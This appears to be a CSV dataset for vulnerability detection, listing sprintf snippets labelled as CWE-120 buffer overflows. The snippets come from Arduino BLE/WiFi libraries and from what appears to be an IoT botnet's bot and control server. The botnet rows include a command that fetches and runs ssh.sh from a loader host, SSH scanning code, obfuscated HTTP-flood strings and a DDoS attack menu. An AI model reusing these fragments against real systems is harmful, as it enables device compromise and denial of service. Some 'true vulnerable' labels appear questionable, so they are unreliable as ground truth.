GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEUtils.cpp,"sprintf((char*) target, ""%.2x"", (char) *source);",120,1,"
	for (int i = 0; i < length; i++) {
		sprintf((char*) target, ""%.2x"", (char) *source);
		source++;
		target += 2;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,"sprintf(str, ""%02x:%02x:%02x:%02x:%02x:%02x"",",120,1,"
  uint8_t *p = bda;
  sprintf(str, ""%02x:%02x:%02x:%02x:%02x:%02x"",
          p[0], p[1], p[2], p[3], p[4], p[5]);
  return str;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""%.2x "", pData[index]);",120,1,"	uint32_t index = 0;
	while (index < length) {
		sprintf(tempBuf, ""%.2x "", pData[index]);
		strcat(hex, tempBuf);
		if (isprint(pData[index])) {
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""%c"", pData[index]);",120,1,"		strcat(hex, tempBuf);
		if (isprint(pData[index])) {
			sprintf(tempBuf, ""%c"", pData[index]);
		} else {
			sprintf(tempBuf, ""."");
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""."");",120,1,"			sprintf(tempBuf, ""%c"", pData[index]);
		} else {
			sprintf(tempBuf, ""."");
		}
		strcat(ascii, tempBuf);
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\ETH.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\ETH.cpp,"sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);",120,1,"    char macStr[18] = { 0 };
    esp_eth_get_mac(mac);
    sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiScan.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiScan.cpp,"sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", it->bssid[0], it->bssid[1], it->bssid[2], it->bssid[3], it->bssid[4], it->bssid[5]);",120,1,"        return String();
    }
    sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", it->bssid[0], it->bssid[1], it->bssid[2], it->bssid[3], it->bssid[4], it->bssid[5]);
    return String(mac);
}
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,"sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);",120,1,"    }
    char mac[18] = { 0 };
    sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(mac);
}
"
2021\embed-iot-core\examples\mqtt\pressure_measurer\pressure_measurer.cpp,Dataset Download,../../Dataset Download/2021\embed-iot-core\examples\mqtt\pressure_measurer\pressure_measurer.cpp,"sprintf(ipArray, ""%d.%d.%d.%d"",",120,1,"    static char ipArray[26];
    IPAddress ipNumber = WiFi.localIP();
    sprintf(ipArray, ""%d.%d.%d.%d"", 
        ipNumber[0], ipNumber[1], ipNumber[2], ipNumber[3]);
    return ipArray;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(request, ""%s %s %s/%s\r\n%s: %s\r\n%s-%s: %s\r\n\r\n"", method, path, decode(""ecc|""), decode(""quq""), decode(""DBwwtr!3Bw""), connections[(rand() % 3)], decode(""1;t=""), decode(""74tw!""), useragents[rand() % NUMITEMS(useragents)]);",120,1,"    int i, timeEnd = time(NULL) + timeFoo;
    char request[2048];
    sprintf(request, ""%s %s %s/%s\r\n%s: %s\r\n%s-%s: %s\r\n\r\n"", method, path, decode(""ecc|""), decode(""quq""), decode(""DBwwtr!3Bw""), connections[(rand() % 3)], decode(""1;t=""), decode(""74tw!""), useragents[rand() % NUMITEMS(useragents)]);
    for (i = 0; i < power; i++) {
        if (fork()) {
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);",120,1,"			}
            memset(rhexstring, 0, 128);
			sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);
			send(std_hex, rhexstring, strlen(rhexstring), 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(tmp, ""%02x"", p[i]);",120,1,"  memset(output, 0, sizeof(output));
  for (i=0;i<strlen(p);i++) {
    sprintf(tmp, ""%02x"", p[i]);
    strcat(output, tmp);
  }
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);",120,1,"                        
						util_zero(ip, sizeof(ip));
						sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));",120,1,"						sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        close(conn->fd);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(rekdevice, ""cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http:",120,1,"    char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, ""cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http://%s/ssh.sh -O ssh.sh || busybox wget http://%s/ssh.sh -O ssh.sh || curl http://%s/ssh.sh -O ssh.sh || busybox curl http://%s/ssh.sh -O ssh.sh; chmod 777 ssh.sh; ./ssh.sh; rm -f ssh.sh &\r\n"", ldserver, ldserver, ldserver, ldserver);
   // printf(""%s"", rekdevice);
    int bufsize = strlen(rekdevice);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(fds[k].ip, ""%s"", inet_ntoa(address.sin_addr));",120,1,"                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
                            sprintf(fds[k].ip, ""%s"", inet_ntoa(address.sin_addr));
                            address.sin_port = HTONS(22);
                            fds[k].sock = socket(AF_INET, SOCK_STREAM, 0);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(str, ""/etc/%s"", decode(""=ru_Brf_""));",120,1,"			FILE *file;
			char str[16];
            sprintf(str, ""/etc/%s"", decode(""=ru_Brf_""));
			file=fopen(str,""r"");
			if (file == NULL) {
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(outfile,""%s%s\n"",cwd,argv[0]+i);",120,1,"					if (strcmp(cwd,""/"")) {
							while(argv[0][i] != '/') i--;
							sprintf(outfile,""%s%s\n"",cwd,argv[0]+i);
							while(!feof(file)) {
									fgets(buf,1024,file);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(string, ""%c]0;Devices: %d | Users Online: %d%c"", '\033', BotsConnected(), OperatorsConnected, '\007');",120,1,"    while(1) {
		memset(string, 0, 2048);
        sprintf(string, ""%c]0;Devices: %d | Users Online: %d%c"", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\e[31mUsername\e[97m: "");",120,1,"	}

        sprintf(botnet, ""\e[31mUsername\e[97m: "");
		if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\e[31mPassword\e[97m: \e[30m"");",120,1,"		snprintf(managements[datafd].userprompt, sizeof(managements[datafd].userprompt), ""\e[31m%s:\e[31m"", managements[datafd].username);
		memset(buf, 0, sizeof(buf));
        sprintf(botnet, ""\e[31mPassword\e[97m: \e[30m"");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(failed_line1, ""\e[105m            Invalid Login!        \r\n"");",120,1,"		char failed_line1[80];
		
		sprintf(failed_line1, ""\e[105m            Invalid Login!        \r\n"");
		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected);",120,1,"		memset(banner_bot_count, 0, 2048);
		
		sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);

"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);",120,1,"		
		sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);

		if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36musers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);",120,1,"	            if(BotsConnected() == 0)
	            {
	                sprintf(botnet, ""\x1b[1;36musers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	            }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mUsers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);",120,1,"	            else
	            {
	                sprintf(botnet, ""\x1b[1;36mUsers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                if(ppc != 0)
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mpowerpc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", ppc);",120,1,"	                if(ppc != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mpowerpc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", ppc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36msh4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sh4);",120,1,"	                if(sh4 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36msh4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sh4);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mx86 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", x86);",120,1,"	                if(x86 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mx86 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", x86);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm3 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv3);",120,1,"	                if(armv3 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm3 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv3);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm4t [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv4t);",120,1,"	                if(armv4t != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm4t [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv4t);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm6 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv6);",120,1,"	                if(armv6 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm6 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv6);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm7 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv7);",120,1,"	                if(armv7 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm7 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv7);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mmips [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mips);",120,1,"	                if(mips != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mmips [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mips);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mm68k [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", m68k);",120,1,"	                if(m68k != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mm68k [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", m68k);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36msparc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sparc);",120,1,"	                if(sparc != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36msparc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sparc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mmipsel [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mipsel);",120,1,"	                if(mipsel != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mmipsel [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mipsel);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36munknown [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", unknown);",120,1,"	                if(unknown != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36munknown [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", unknown);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mTotal: [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", BotsConnected());",120,1,"	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                sprintf(botnet, ""\x1b[1;36mTotal: [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", BotsConnected());
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(statuscount, ""TELNET DEVICES: %d  TELNET STATUS: %d\r\n"", TELFound, scannerreport);",120,1,"			}
			else if(strstr(buf, ""stat"")){
				sprintf(statuscount, ""TELNET DEVICES: %d  TELNET STATUS: %d\r\n"", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
			}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");",120,1,"				char ddosline11 [150];
				char ddosline12 [150];
				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");",120,1,"				char ddosline12 [150];
				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");",120,1,"				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");",120,1,"				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");",120,1,"				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
"
